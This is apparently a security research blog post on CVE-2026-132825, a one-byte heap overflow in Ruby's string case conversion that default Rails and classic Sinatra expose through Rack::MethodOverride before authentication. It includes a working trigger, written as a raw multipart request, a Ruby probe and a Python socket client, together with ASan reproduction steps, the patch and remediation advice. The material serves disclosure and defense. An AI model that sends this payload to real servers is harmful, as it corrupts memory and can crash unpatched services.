---
title: "Ruby2Shell: the one-byte overflow that runs before Rails authentication"
description: "Reproducing the one-byte heap overflow in Ruby's string case conversion (CVE-2026-132825) through Rack::MethodOverride, before authentication, and checking the patched build."
pubDate: 2026-11-19
pubTime: "09:06"
tags: ["security", "ruby", "cve", "rails", "exploitability"]
draft: false
image: "/assets/images/post-ruby2shell.jpg"
---

CVE-2026-132825 is a one-byte heap overflow in Ruby's string case conversion. The Ruby advisory says proof-of-concept code shows RCE “in some scenarios.” Veria Labs says default Rails and classic-style Sinatra are reachable without authentication. The CVE record scores it `AV:L/AC:H` 7.4.

We found a concrete pre-auth path: a multipart `_method` field tagged `ISO-8859-1` reaches `String#upcase` inside `Rack::MethodOverride` before the application runs. ASan confirms the one-byte write on Ruby 3.4.12. The patched build is clean. We didn't build an RCE chain.

## The bug

Ruby's `case_map` for 14 single-byte encodings writes `ß` as `SS` when upcasing, or `ss` when case-folding. The loop checks for one byte of room, then writes two:

```c
/* enc/iso_8859_1.c, Ruby 3.4.12 */
while (*pp < end && to < to_end) {
  code = *(*pp)++;
  if (code == SHARP_s) {
    if (flags & ONIGENC_CASE_UPCASE) {
      flags |= ONIGENC_CASE_MODIFIED;
      *to++ = 'S';
      code = (flags & ONIGENC_CASE_TITLECASE) ? 's' : 'S';
    }
    else if (flags & ONIGENC_CASE_FOLD) {
      flags |= ONIGENC_CASE_MODIFIED;
      *to++ = 's';
      code = 's';
    }
  }
  ...
  *to++ = code;
}
```

The output buffer comes from `rb_str_casemap`:

```c
/* string.c */
#define CASE_MAPPING_ADDITIONAL_LENGTH 20
...
size_t capa = (size_t)(source_end - source_current) * ++buffer_count
              + CASE_MAPPING_ADDITIONAL_LENGTH;
```

For the first pass, that is the input length plus 20. Each `ß` adds one byte beyond the input length. A string of 21 `ß` characters leaves one byte of room when the last one is processed, and the second byte lands past the buffer. The written byte is always `S` (`0x53`) or `s` (`0x73`); the attacker controls the input length and therefore the buffer size, not the byte.

The affected methods are `upcase`, `swapcase`, `downcase(:fold)`, `casecmp?`, and `capitalize`. UTF-8 uses a different code path and isn't affected. The 14 encodings are ISO-8859-1, -2, -3, -4, -9, -10, -13, -14, -15, -16, and Windows-1250, -1252, -1254, -1257. The loop has been there since Ruby 2.4.0.

## The fix

Commit `d582f8f13d700d8e39714d3a8f11eb4bd2bc69f0` changes the bound check in all 14 files:

```c
-    while (*pp < end && to < to_end) {
+    while (*pp < end && to_end - to > 1) {
```

The test loops `n = 1..64` over every affected encoding and checks `upcase`, `downcase(:fold)`, `swapcase`, `capitalize`, the `a + ß...` alignment, and `casecmp?`. Fixed releases are Ruby 3.3.14, 3.4.13, and 4.0.10. Ruby 3.2 and older are end-of-life and won't receive the fix.

## The pre-auth path

Two pieces compose.

Rack's multipart parser tags a `text/plain` part body with the charset from that part's `Content-Type`:

```ruby
# rack/multipart/parser.rb, tag_multipart_encoding
if k == "charset"
  encoding = find_encoding(v)
end
...
name.force_encoding(encoding)
body.force_encoding(encoding)
```

`Rack::MethodOverride` upcases the `_method` value before the app:

```ruby
# rack/method_override.rb
def method_override(env)
  req = Request.new(env)
  method = method_override_param(req) || env[HTTP_METHOD_OVERRIDE_HEADER]
  method.to_s.upcase
end
```

Rails includes that middleware in the default stack unless the app is API-only:

```ruby
# railties/lib/rails/application/default_middleware_stack.rb
middleware.use ::Rack::MethodOverride unless config.api_only
```

Sinatra classic enables it by default; modular Sinatra doesn't:

```ruby
# sinatra/lib/sinatra/base.rb
builder.use Rack::MethodOverride if method_override?
...
set :method_override, true   # classic style
```

Put them together and the request is:

```
POST / HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="_method"
Content-Type: text/plain; charset=ISO-8859-1

<21 bytes of 0xDF>
--X--
```

Rack tags the field body ISO-8859-1. `Rack::MethodOverride` calls `upcase`, and the one-byte overflow happens before routing, authentication, or any controller code. The override doesn't have to be accepted: `method.to_s.upcase` runs first, and the request continues as POST.

This matches the reported scope: default Rails (non-API) and classic-style Sinatra. API-only Rails skips the middleware, and modular Sinatra has `method_override` off by default.

## The proof

We built Ruby 3.4.12 with AddressSanitizer. On Debian/Ubuntu, install
`build-essential zlib1g-dev libssl-dev libyaml-dev libffi-dev libreadline-dev libgmp-dev`
first.

```sh
curl -O https://cache.ruby-lang.org/pub/ruby/3.4/ruby-3.4.12.tar.gz
tar xf ruby-3.4.12.tar.gz
cd ruby-3.4.12
./configure --prefix="$PWD/../asan" --disable-install-doc --without-gmp \
  CFLAGS="-O1 -g -fsanitize=address -fno-omit-frame-pointer" \
  LDFLAGS="-fsanitize=address"
make -j"$(nproc)"
make install
```

Then the probe, which builds the multipart body and calls `Rack::MethodOverride` directly:

```ruby
require "rack"
require "rack/method_override"
require "rack/mock"

module TraceCase
  def upcase(*args, **kw)
    if (encoding.name.start_with?("ISO-8859-") || encoding.name.start_with?("Windows-125")) &&
       bytes.include?(0xDF)
      warn "HIT upcase enc=#{encoding.name}"
      warn caller(1, 4).inspect
    end
    super
  end
end
String.prepend(TraceCase)

boundary = "X"
body = +"--#{boundary}\r\n"
body << "Content-Disposition: form-data; name=\"_method\"\r\n"
body << "Content-Type: text/plain; charset=ISO-8859-1\r\n"
body << "\r\n"
body << ("\xDF".b * 21)
body << "\r\n--#{boundary}--\r\n"

app = ->(env) { [200, {"content-type" => "text/plain"}, ["app reached\n"]] }
wrapped = Rack::MethodOverride.new(app)
env = Rack::MockRequest.env_for("/", method: "POST",
  "CONTENT_TYPE" => "multipart/form-data; boundary=#{boundary}",
  input: body)
status, headers, response = wrapped.call(env)
puts "status=#{status} body=#{response.each.to_a.join.inspect}"
puts "method=#{env["REQUEST_METHOD"].inspect}"
```

Vulnerable Ruby 3.4.12:

```
HIT upcase enc=ISO-8859-1
[... rack/method_override.rb:36:in 'Rack::MethodOverride#method_override' ...]

==ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 1 at 0x5070000c4f41 thread T0
    #0 case_map enc/iso_8859_1.c:293
    #1 rb_str_casemap string.c:7839
    #2 rb_str_upcase string.c:8017
    ...
0x5070000c4f41 is located 0 bytes after 65-byte region
allocated by ... rb_str_casemap string.c:7834
SUMMARY: AddressSanitizer: heap-buffer-overflow enc/iso_8859_1.c:293 in case_map
```

The 65-byte region is the `mapping_buffer` header plus the 41-byte case-mapping buffer. The write is one byte past it.

The same probe on the patched build reaches the method and returns cleanly:

```
HIT upcase enc=ISO-8859-1
status=200 body="app reached\n"
method="POST"
```

### Over real HTTP

We sent the same multipart request over TCP to three server stacks:

| Stack | Server | Result |
|---|---|---|
| Rack + `Rack::MethodOverride` | WEBrick :9292 | ASan `case_map` at `iso_8859_1.c:293`; connection aborted |
| Sinatra 4.2.2 classic | WEBrick :4567 | same ASan report |
| Rails 8.1.4.1, non-API `Rails::Application` | WEBrick :3000 | same ASan report |
| Fixed Rack | WEBrick :9293 | HTTP 200, no ASan report |

The client:

```python
import socket, sys
body = (b"--X\r\n"
        b"Content-Disposition: form-data; name=\"_method\"\r\n"
        b"Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n"
        + b"\xdf" * 21 +
        b"\r\n--X--\r\n")
req = (b"POST / HTTP/1.1\r\nHost: 127.0.0.1\r\n"
       b"Content-Type: multipart/form-data; boundary=X\r\n"
       b"Content-Length: " + str(len(body)).encode() + b"\r\n"
       b"Connection: close\r\n\r\n" + body)
s = socket.create_connection(("127.0.0.1", int(sys.argv[1])), timeout=10)
s.sendall(req)
try:
    print(s.recv(4096))
except Exception as e:
    print("client:", type(e).__name__, e)
```

The Rails test uses a minimal `Rails::Application` with `action_controller/railtie`, not a generated app. It builds the default non-API middleware stack, which is the part that matters. In all three vulnerable runs, the ASan stack goes through `Rack::MethodOverride#method_override` before the app. Under ASan the worker aborts; without ASan the write is silent and the request continues.

## The CVE score problem

The CVE record for CVE-2026-132825 carries:

```
CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
7.4 High
```

`AV:L` is local, `AC:H` high complexity. That doesn't describe the path above: an unauthenticated HTTP request reaches the vulnerable call before the application. The record was published on 19 November. Its vector may reflect a library-level view rather than the middleware route. Scanners that key on the CVE score are likely to treat this as local and high-complexity, which understates a network-reachable one-byte write in default Rails.

The Ruby advisory itself gives no score. Veria Labs calls the issue critical. Our HTTP tests confirm reachability; they don't confirm code execution.

## The other six flaws

The same Ruby release fixes six more issues:

| Advisory | Flaw | Reached by |
|---|---|---|
| GHSA-7x2q-68qv-6p8x | Double free in regexp compilation | Attacker-controlled pattern |
| GHSA-87fm-7w84-j2px | Integer overflow in case conversion, heap overflow | Crafted text, like Ruby2Shell |
| GHSA-3p8q-wmhx-vm2w | Integer overflow in regexp compilation, heap overflow | Attacker-controlled pattern |
| GHSA-7whj-cfh7-xgm4 | Heap overflow in `Regexp#to_s` | Attacker-controlled pattern |
| GHSA-wpqw-5qxg-m68r | Out-of-bounds read in case-insensitive matching | Attacker-controlled pattern |
| GHSA-pvgc-g7gj-pv6h | Out-of-bounds read in backreference matching | Crafted string; disclosure or crash |

Four need the application to compile or run an attacker-supplied regular expression, which most applications don't. The second case-conversion flaw is text-driven and worth checking if Ruby2Shell is reachable.

## Who is affected

- Ruby 3.3.0–3.3.13, 3.4.0–3.4.12, 4.0.0–4.0.9.
- Every Ruby release back to 2.4.0 on branches that are now end-of-life.
- Fixed: 3.3.14, 3.4.13, 4.0.10.

Bundled runtimes matter. As of Veria Labs' 19 November update, GitLab 19.6.0, GitHub Enterprise Server 3.22.5, and Chatwoot 4.20.0 bundled an affected Ruby; Mastodon, OpenProject, and Discourse had fixed builds. Check the vendor advisory, not the version string: some products patch the Ruby they ship without changing the Ruby version.

The advisory says PoCs exist. It doesn't report exploitation in the wild.

## What to do

- Upgrade the interpreter to 3.3.14, 3.4.13, or 4.0.10. A Rails or gem update does nothing; this is the runtime.
- Restart every Ruby process. A Puma phased restart keeps the old master on the old Ruby binary, so it doesn't apply the upgrade.
- Rebuild container images and anything pinning Ruby in a Dockerfile or `.ruby-version`.
- Move Ruby 3.2 and older off the internet, or isolate it. There is no fix coming.
- If you can't upgrade, removing or disabling `Rack::MethodOverride` closes this specific path, but not the underlying bug. The general bug is reachable from any code that case-converts legacy-encoded text, so this is a stopgap, not a remediation.

No official workaround exists. UTF-8 input doesn't take the vulnerable path, but you can't assume every input is UTF-8 in a middleware stack you don't control.

## What we didn't do

We didn't build an RCE chain. The primitive in this path is one fixed byte (`S` or `s`) past a case-mapping buffer. Turning that into code execution needs heap shaping, a useful neighbor, and a way to survive the corruption; Veria says it has a chain but hasn't published it. The one-byte write is proven; the code-execution claim isn't reproduced here.

We also didn't run a generated Rails application. The minimal `Rails::Application` uses the same default middleware stack, and the ASan stack shows the call site. A generated app would add routes and controllers that aren't on this path.

## Reproduce

The short version:

1. Build Ruby 3.4.12 with ASan as above.
2. `gem install rack rackup webrick sinatra rails`.
3. Run the probe, or start `config.ru`, `sinatra_app.rb`, or `rails_app.ru` and send the multipart request with the Python client.
4. Apply the 14 one-line fixes, rebuild, and rerun for the clean control.

The servers:

```ruby
# config.ru
require "rack"
require "rack/method_override"
use Rack::MethodOverride
run ->(env) { [200, {"content-type" => "text/plain"}, ["app reached\n"]] }
```

```ruby
# sinatra_app.rb
require "sinatra"
get "/" do
  "ok"
end
```

```ruby
# rails_app.ru
require "rails"
require "action_controller/railtie"
require "logger"

class TestApp < Rails::Application
  config.root = __dir__
  config.secret_key_base = "x" * 64
  config.eager_load = false
  config.logger = Logger.new($stdout)
  config.log_level = :warn
  config.hosts.clear
end

TestApp.initialize!
run TestApp
```

Run with the ASan Ruby:

```sh
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
  asan/bin/rackup -o 127.0.0.1 -p 9292 config.ru
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
  asan/bin/ruby sinatra_app.rb -o 127.0.0.1 -p 4567
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
  asan/bin/rackup -o 127.0.0.1 -p 3000 rails_app.ru
```

Then `python3 http_probe.py <port>` and read the server log.

## Sources

- Ruby advisory: https://www.ruby-lang.org/en/news/2026/11/18/multiple-vulnerabilities-in-regexp-and-string/
- GHSA-34m4-m9fh-gqp5: https://github.com/ruby/ruby/security/advisories/GHSA-34m4-m9fh-gqp5
- CVE-2026-132825: https://www.cve.org/CVERecord?id=CVE-2026-132825
- Fix commit: https://github.com/ruby/ruby/commit/d582f8f13d700d8e39714d3a8f11eb4bd2bc69f0
- Veria Labs: https://verialabs.com/ruby2shell/
- Equixly analysis: https://equixly.com/blog/2026/11/19/ruby2shell-pre-auth-heap-overflow-in-ruby/
